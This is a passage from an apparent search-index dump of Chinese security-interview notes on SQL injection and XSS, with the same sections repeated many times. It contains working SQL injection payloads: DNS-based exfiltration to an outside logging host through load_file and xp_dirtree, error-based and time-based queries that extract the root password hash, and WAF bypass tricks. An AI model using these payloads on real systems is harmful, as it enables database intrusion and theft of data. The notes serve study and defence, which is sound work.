database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#16数据库全局日志写入"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#17数据库慢查询日志写入"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#18mysql-在渗透测试中的利用"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#02-xss漏洞"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-1"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2分类-1"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3危害"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4防御"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5如何快速判定xss类型"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site 